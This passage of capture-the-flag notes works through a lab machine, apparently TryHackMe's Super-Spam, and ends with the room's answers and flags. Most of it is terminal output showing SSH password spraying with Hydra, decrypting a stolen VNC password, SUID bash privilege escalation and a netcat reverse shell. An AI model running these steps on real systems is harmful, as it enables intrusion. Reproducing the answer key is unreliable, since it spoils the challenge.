10.8.19.103 - - [06/Jul/2023 23:44:38] "GET /.MessagesBackupToGalactic/c3.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:39] "GET /.MessagesBackupToGalactic/c4.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:41] "GET /.MessagesBackupToGalactic/c5.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:42] "GET /.MessagesBackupToGalactic/c6.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:43] "GET /.MessagesBackupToGalactic/c7.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:45] "GET /.MessagesBackupToGalactic/c8.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:46] "GET /.MessagesBackupToGalactic/c9.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:47] "GET /.MessagesBackupToGalactic/d.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:48] "GET /.MessagesBackupToGalactic/note.txt HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:48] "GET /.MessagesBackupToGalactic/xored.py HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/XOR]
└─$ wget -r http://superspam.thm:8000/
--2023-07-06 19:44:23--  http://superspam.thm:8000/
Resolving superspam.thm (superspam.thm)... 10.10.225.4
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 750 [text/html]
Saving to: ‘superspam.thm:8000/index.html’

superspam.th 100%     750  --.-KB/s    in 0s      

2023-07-06 19:44:23 (30.8 MB/s) - ‘superspam.thm:8000/index.html’ saved [750/750]

Loading robots.txt; please ignore errors.
--2023-07-06 19:44:23--  http://superspam.thm:8000/robots.txt
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 404 File not found
2023-07-06 19:44:24 ERROR 404: File not found.

--2023-07-06 19:44:24--  http://superspam.thm:8000/.bash_history
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [application/octet-stream]
Saving to: ‘superspam.thm:8000/.bash_history’

superspam.th            0  --.-KB/s    in 0s      

2023-07-06 19:44:24 (0.00 B/s) - ‘superspam.thm:8000/.bash_history’ saved [0/0]

--2023-07-06 19:44:24--  http://superspam.thm:8000/.bash_logout
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 220 [application/octet-stream]
Saving to: ‘superspam.thm:8000/.bash_logout’

superspam.th 100%     220  --.-KB/s    in 0.05s   

2023-07-06 19:44:24 (4.06 KB/s) - ‘superspam.thm:8000/.bash_logout’ saved [220/220]

--2023-07-06 19:44:24--  http://superspam.thm:8000/.bashrc
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3771 (3.7K) [application/octet-stream]
Saving to: ‘superspam.thm:8000/.bashrc’

superspam.th 100%   3.68K  --.-KB/s    in 0s      

2023-07-06 19:44:25 (239 MB/s) - ‘superspam.thm:8000/.bashrc’ saved [3771/3771]

--2023-07-06 19:44:25--  http://superspam.thm:8000/.cache/
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 404 No permission to list directory
2023-07-06 19:44:25 ERROR 404: No permission to list directory.

--2023-07-06 19:44:25--  http://superspam.thm:8000/.gnupg/
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 404 No permission to list directory
2023-07-06 19:44:25 ERROR 404: No permission to list directory.

--2023-07-06 19:44:25--  http://superspam.thm:8000/.MessagesBackupToGalactic/
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 838 [text/html]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/index.html’

superspam.th 100%     838  --.-KB/s    in 0s      

2023-07-06 19:44:26 (12.5 MB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/index.html’ saved [838/838]

--2023-07-06 19:44:26--  http://superspam.thm:8000/.profile
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 807 [application/octet-stream]
Saving to: ‘superspam.thm:8000/.profile’

superspam.th 100%     807  --.-KB/s    in 0s      

2023-07-06 19:44:26 (46.1 MB/s) - ‘superspam.thm:8000/.profile’ saved [807/807]

--2023-07-06 19:44:26--  http://superspam.thm:8000/calcs.txt
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28 [text/plain]
Saving to: ‘superspam.thm:8000/calcs.txt’

superspam.th 100%      28  --.-KB/s    in 0s      

2023-07-06 19:44:27 (1.38 MB/s) - ‘superspam.thm:8000/calcs.txt’ saved [28/28]

--2023-07-06 19:44:27--  http://superspam.thm:8000/prices/
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 311 [text/html]
Saving to: ‘superspam.thm:8000/prices/index.html’

superspam.th 100%     311  --.-KB/s    in 0s      

2023-07-06 19:44:27 (8.42 MB/s) - ‘superspam.thm:8000/prices/index.html’ saved [311/311]

--2023-07-06 19:44:27--  http://superspam.thm:8000/work/
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 307 [text/html]
Saving to: ‘superspam.thm:8000/work/index.html’

superspam.th 100%     307  --.-KB/s    in 0s      

2023-07-06 19:44:27 (7.68 MB/s) - ‘superspam.thm:8000/work/index.html’ saved [307/307]

--2023-07-06 19:44:27--  http://superspam.thm:8000/.MessagesBackupToGalactic/c1.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 172320 (168K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c1.png’

superspam.th 100% 168.28K   163KB/s    in 1.0s    

2023-07-06 19:44:29 (163 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c1.png’ saved [172320/172320]

--2023-07-06 19:44:29--  http://superspam.thm:8000/.MessagesBackupToGalactic/c10.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 171897 (168K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c10.png’

superspam.th 100% 167.87K   179KB/s    in 0.9s    

2023-07-06 19:44:30 (179 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c10.png’ saved [171897/171897]

--2023-07-06 19:44:30--  http://superspam.thm:8000/.MessagesBackupToGalactic/c2.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 168665 (165K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c2.png’

superspam.th 100% 164.71K   175KB/s    in 0.9s    

2023-07-06 19:44:31 (175 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c2.png’ saved [168665/168665]

--2023-07-06 19:44:31--  http://superspam.thm:8000/.MessagesBackupToGalactic/c3.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 171897 (168K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c3.png’

superspam.th 100% 167.87K   178KB/s    in 0.9s    

2023-07-06 19:44:33 (178 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c3.png’ saved [171897/171897]

--2023-07-06 19:44:33--  http://superspam.thm:8000/.MessagesBackupToGalactic/c4.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 171462 (167K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c4.png’

superspam.th 100% 167.44K   175KB/s    in 1.0s    

2023-07-06 19:44:34 (175 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c4.png’ saved [171462/171462]

--2023-07-06 19:44:34--  http://superspam.thm:8000/.MessagesBackupToGalactic/c5.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 167772 (164K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c5.png’

superspam.th 100% 163.84K   176KB/s    in 0.9s    

2023-07-06 19:44:35 (176 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c5.png’ saved [167772/167772]

--2023-07-06 19:44:35--  http://superspam.thm:8000/.MessagesBackupToGalactic/c6.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 167772 (164K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c6.png’

superspam.th 100% 163.84K   179KB/s    in 0.9s    

2023-07-06 19:44:37 (179 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c6.png’ saved [167772/167772]

--2023-07-06 19:44:37--  http://superspam.thm:8000/.MessagesBackupToGalactic/c7.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 171462 (167K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c7.png’

superspam.th 100% 167.44K   167KB/s    in 1.0s    

2023-07-06 19:44:38 (167 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c7.png’ saved [171462/171462]

--2023-07-06 19:44:38--  http://superspam.thm:8000/.MessagesBackupToGalactic/c8.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 171734 (168K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c8.png’

superspam.th 100% 167.71K   170KB/s    in 1.0s    

2023-07-06 19:44:39 (170 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c8.png’ saved [171734/171734]

--2023-07-06 19:44:39--  http://superspam.thm:8000/.MessagesBackupToGalactic/c9.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 173994 (170K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/c9.png’

superspam.th 100% 169.92K   181KB/s    in 0.9s    

2023-07-06 19:44:41 (181 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/c9.png’ saved [173994/173994]

--2023-07-06 19:44:41--  http://superspam.thm:8000/.MessagesBackupToGalactic/d.png
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20987 (20K) [image/png]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/d.png’

superspam.th 100%  20.50K   112KB/s    in 0.2s    

2023-07-06 19:44:41 (112 KB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/d.png’ saved [20987/20987]

--2023-07-06 19:44:41--  http://superspam.thm:8000/.MessagesBackupToGalactic/note.txt
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 497 [text/plain]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/note.txt’

superspam.th 100%     497  --.-KB/s    in 0s      

2023-07-06 19:44:42 (17.4 MB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/note.txt’ saved [497/497]

--2023-07-06 19:44:42--  http://superspam.thm:8000/.MessagesBackupToGalactic/xored.py
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1200 (1.2K) [text/plain]
Saving to: ‘superspam.thm:8000/.MessagesBackupToGalactic/xored.py’

superspam.th 100%   1.17K  --.-KB/s    in 0s      

2023-07-06 19:44:42 (66.2 MB/s) - ‘superspam.thm:8000/.MessagesBackupToGalactic/xored.py’ saved [1200/1200]

FINISHED --2023-07-06 19:44:42--
Total wall clock time: 19s
Downloaded: 22 files, 1.7M in 9.8s (173 KB/s)

┌──(witty㉿kali)-[~/XOR/superspam.thm:8000/.MessagesBackupToGalactic]
└─$ eog d.png  

$$L3qwert30kcool

www-data@super-spam:/home$ ls
ls
benjamin_blogger  donalddump  lucy_loser  personal  super-spam

password spraying

┌──(witty㉿kali)-[~/XOR/superspam.thm:8000/.MessagesBackupToGalactic]
└─$ cat user.txt                
donalddump
benjamin_blogger
lucy_loser
personal  
super-spam

┌──(witty㉿kali)-[~/XOR/superspam.thm:8000/.MessagesBackupToGalactic]
└─$ cat pass.txt     
$$L3qwert30kcool
┌──(witty㉿kali)-[~/XOR/superspam.thm:8000/.MessagesBackupToGalactic]
┌──(witty㉿kali)-[~/XOR/superspam.thm:8000/.MessagesBackupToGalactic]
└─$ hydra -L user.txt -P pass.txt ssh://superspam.thm -s 4012
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-06 19:50:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://superspam.thm:4012/
[4012][ssh] host: superspam.thm   login: donalddump   password: $$L3qwert30kcool
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-06 19:50:34

www-data@super-spam:/home$ su donalddump
su donalddump
Password: $$L3qwert30kcool

bash: /home/donalddump/.bashrc: Permission denied
donalddump@super-spam:/home$ ls -lah donalddump
ls -lah donalddump
ls: cannot access 'donalddump/.profile': Permission denied
ls: cannot access 'donalddump/user.txt': Permission denied
ls: cannot access 'donalddump/passwd': Permission denied
ls: cannot access 'donalddump/.bash_history': Permission denied
ls: cannot access 'donalddump/.': Permission denied
ls: cannot access 'donalddump/morning': Permission denied
ls: cannot access 'donalddump/.cache': Permission denied
ls: cannot access 'donalddump/.bash_logout': Permission denied
ls: cannot access 'donalddump/notes': Permission denied
ls: cannot access 'donalddump/.gnupg': Permission denied
ls: cannot access 'donalddump/..': Permission denied
ls: cannot access 'donalddump/.bashrc': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
l????????? ? ? ? ?            ? .bash_history
-????????? ? ? ? ?            ? .bash_logout
-????????? ? ? ? ?            ? .bashrc
d????????? ? ? ? ?            ? .cache
d????????? ? ? ? ?            ? .gnupg
d????????? ? ? ? ?            ? morning
d????????? ? ? ? ?            ? notes
-????????? ? ? ? ?            ? passwd
-????????? ? ? ? ?            ? .profile
-????????? ? ? ? ?            ? user.txt

donalddump@super-spam:/home$ chmod 777 donalddump/
chmod 777 donalddump/
donalddump@super-spam:/home$ ls -lah donalddump
ls -lah donalddump
total 44K
drwxrwxrwx 6 donalddump donalddump 4.0K Apr  9  2021 .
drwxr-xr-x 7 root       root       4.0K Feb 20  2021 ..
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 donalddump donalddump  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 donalddump donalddump 3.7K Feb 20  2021 .bashrc
drwx------ 2 donalddump donalddump 4.0K Apr  8  2021 .cache
drwx------ 3 donalddump donalddump 4.0K Apr  8  2021 .gnupg
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 morning
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 notes
-rw-r--r-- 1 root       root          8 Apr  8  2021 passwd
-rw-r--r-- 1 donalddump donalddump  807 Feb 20  2021 .profile
-rw-rw-r-- 1 donalddump donalddump   36 Apr  9  2021 user.txt
donalddump@super-spam:/home$ cd donalddump
cd donalddump
donalddump@super-spam:~$ ls
ls
morning  notes	passwd	user.txt
donalddump@super-spam:~$ cat user.txt
cat user.txt
flag{-eteKc=skineogyls45«ey?t+du8}

┌──(witty㉿kali)-[~/XOR/superspam.thm:8000/.MessagesBackupToGalactic]
└─$ wget http://superspam.thm:8001/passwd
--2023-07-06 19:56:20--  http://superspam.thm:8001/passwd
Resolving superspam.thm (superspam.thm)... 10.10.225.4
Connecting to superspam.thm (superspam.thm)|10.10.225.4|:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8 [application/octet-stream]
Saving to: ‘passwd’

passwd              100%[==================>]       8  --.-KB/s    in 0s      

2023-07-06 19:56:20 (472 KB/s) - ‘passwd’ saved [8/8]

donalddump@super-spam:~$ python3 -m http.server 8001
python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.8.19.103 - - [06/Jul/2023 23:56:27] "GET /passwd HTTP/1.1" 200 -

┌──(root㉿kali)-[/home/witty/XOR/superspam.thm:8000/.MessagesBackupToGalactic]
└─# tightvncpasswd       
Using password file /root/.vnc/passwd
VNC directory /root/.vnc does not exist, creating.

┌──(root㉿kali)-[/home/witty/XOR/superspam.thm:8000/.MessagesBackupToGalactic]
└─# pwd                                            
/home/witty/XOR/superspam.thm:8000/.MessagesBackupToGalactic

┌──(root㉿kali)-[~/.vnc]
└─# cp /home/witty/XOR/superspam.thm:8000/.MessagesBackupToGalactic/passwd .
                                                                               
┌──(root㉿kali)-[~/.vnc]
└─# ls
passwd

──(root㉿kali)-[~/.vnc]
└─# tightvncpasswd
Using password file /root/.vnc/passwd
Password: 
Verify:   
Would you like to enter a view-only password (y/n)? y
Password: 
Verify: 

uhhm another way

┌──(root㉿kali)-[/home/witty/XOR/superspam.thm:8000]
└─# git clone https://github.com/jeroennijhof/vncpwd && cd vncpwd
Cloning into 'vncpwd'...
remote: Enumerating objects: 28, done.
remote: Total 28 (delta 0), reused 0 (delta 0), pack-reused 28
Receiving objects: 100% (28/28), 22.15 KiB | 263.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.

┌──(root㉿kali)-[/home/witty/XOR/superspam.thm:8000/vncpwd]
└─# gcc -o vncpwd vncpwd.c d3des.c
                                                                               
┌──(root㉿kali)-[/home/witty/XOR/superspam.thm:8000/vncpwd]
└─# ls
d3des.c  d3des.h  LICENSE  Makefile  README  vncpwd  vncpwd.c

┌──(root㉿kali)-[/home/witty/XOR/superspam.thm:8000/vncpwd]
└─# ./vncpwd /home/witty/XOR/superspam.thm:8000/.MessagesBackupToGalactic/passwd
Password: vncpriv

┌──(root㉿kali)-[/home/witty/XOR/superspam.thm:8000/vncpwd]
└─# xtightvncviewer superspam.thm:5901
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: vncpriv
Authentication successful
Desktop name "root's X desktop (super-spam:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0

chmod +s /bin/bash

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from superspam.thm [10.10.225.4] 60434
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ /bin/bash -p
/bin/bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cd /root
l
/bin/bash: line 3: l: command not found
ls
ls -lah
total 76K
drwx------  8 root root  20K Jul  6 23:16 .
drwxr-xr-x 22 root root 4.0K Apr  9  2021 ..
-rw-------  1 root root  642 Jul  6 23:16 .Xauthority
lrwxrwxrwx  1 root root    9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Feb 19  2021 .cache
drwx------  3 root root 4.0K Feb 19  2021 .gnupg
drwxr-xr-x  3 root root 4.0K Feb 19  2021 .local
-rw-------  1 root root  969 May 29  2021 .mysql_history
drwxr-xr-x  2 root root 4.0K Feb 24  2021 .nothing
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Apr  8  2021 .selected_editor
drwx------  2 root root 4.0K Feb 19  2021 .ssh
-rw-------  1 root root    0 May 29  2021 .viminfo
drwx------  2 root root 4.0K Jul  6 23:16 .vnc
-rw-r--r--  1 root root  208 Apr  9  2021 .wget-hsts
-rw-------  1 root root 1.4K Apr  8  2021 .xsession-errors
cd .nothing
ls
r00t.txt
cat r00t.txt

what am i?: MZWGCZ33NF2GKZKLMRRHKPJ5NBVEWNWCU5MXKVLVG4WTMTS7PU======

KRUGS4ZANFZSA3TPOQQG65TFOIQSAWLPOUQG2YLZEBUGC5TFEBZWC5TFMQQHS33VOIQGEZLMN53GKZBAOBWGC3TFOQQHI2DJOMQHI2LNMUWCASDBMNVWK4RNNVQW4LBAMJ2XIICJEB3WS3DMEBRGKIDCMFRWWIDXNF2GQIDBEBRGSZ3HMVZCYIDNN5ZGKIDEMFZXIYLSMRWHSIDQNRQW4IDUN4QGOZLUEBZGSZBAN5TCA5DIMF2CA2LOMZSXE2LPOIQG64DFOJQXI2LOM4QHG6LTORSW2LBAJRUW45LYFYQA====

┌──(root㉿kali)-[/home/witty/XOR/superspam.thm:8000/vncpwd]
└─# echo 'KRUGS4ZANFZSA3TPOQQG65TFOIQSAWLPOUQG2YLZEBUGC5TFEBZWC5TFMQQHS33VOIQGEZLMN53GKZBAOBWGC3TFOQQHI2DJOMQHI2LNMUWCASDBMNVWK4RNNVQW4LBAMJ2XIICJEB3WS3DMEBRGKIDCMFRWWIDXNF2GQIDBEBRGSZ3HMVZCYIDNN5ZGKIDEMFZXIYLSMRWHSIDQNRQW4IDUN4QGOZLUEBZGSZBAN5TCA5DIMF2CA2LOMZSXE2LPOIQG64DFOJQXI2LOM4QHG6LTORSW2LBAJRUW45LYFYQA====' | base32 -d
This is not over! You may have saved your beloved planet this time, Hacker-man, but I will be back with a bigger, more dastardly plan to get rid of that inferior operating system, Linux.  

┌──(root㉿kali)-[/home/witty/XOR/superspam.thm:8000/vncpwd]
└─# echo 'MZWGCZ33NF2GKZKLMRRHKPJ5NBVEWNWCU5MXKVLVG4WTMTS7PU======' | base32 -d
flag{iteeKdbu==hjK6§YuUu7-6N_}  

```

![[Pasted image 20230706175407.png]]

![[Pasted image 20230705195355.png]]

![[Pasted image 20230705195434.png]]
![[Pasted image 20230706175801.png]]
![[Pasted image 20230706184647.png]]
![[Pasted image 20230706191048.png]]

What CMS and version is being used? (format: wordpress x.x.x)  

*concrete5 8.5.2*

What is the user flag?  

*flag{-eteKc=skineogyls45«ey?t+du8}*

What type of encryption did super-spam use to send his encrypted messages?  

*xor*

What key information was embedded in one of super-spam's encrypted messages?  

	*$$L3qwert30kcool*

What is the root flag?

*flag{iteeKdbu==hjK6§YuUu7-6N_} *


[[Annie]]